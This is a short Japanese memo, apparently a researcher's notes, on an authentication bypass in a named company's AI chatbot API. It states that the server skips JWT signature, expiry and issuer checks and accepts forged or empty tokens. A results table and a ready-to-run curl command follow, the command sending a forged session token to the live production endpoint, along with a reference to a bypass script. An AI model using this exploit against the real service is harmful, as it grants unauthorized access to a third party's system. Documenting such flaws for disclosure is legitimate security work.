# 超ざっくりメモ 
Circles.life AI Chatbot API  ‑ `aistore-api.circles.life`

## TL;DR
- **JWT の署名検証 ≒ してない**
- **exp / iat / iss / externalId 全部無視**
- **payload 空でも OK**
- **つまり誰でも API 叩き放題**

---

## 1. どんな感じで通る？
| 送った JWT | 結果 |
|---|---|
| 正規（期限内） | 200 ✅ |
| 期限切れ | 200 ✅ |
| 署名 `AAAA...`（偽造） | 200 ✅ |
| `{"data":{}}` だけ | 200 ✅ |
| `hacked.hacked.hacked` | **403 ❌** ← ただし形式エラーっぽい |

→ **サーバーは「JWT であること」だけ見て、中身はスルー**

---

## 2. 最低限 PoC
```bash
# 1. 偽造 JWT を手で作る
python3 jwt_auth_bypass.py
# => Status: 200 で応答返る
```

簡易版ワンライナー
```bash
curl -k 'https://aistore-api.circles.life/v1/povo/aistore/chatbot/completions' \
  -H 'Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7fX0.aaaa' \
  -H 'Content-Type: application/json' \
  -d '{"user_prompt":"今何時？","feature_id":"ai_apps_chatbox"}'
```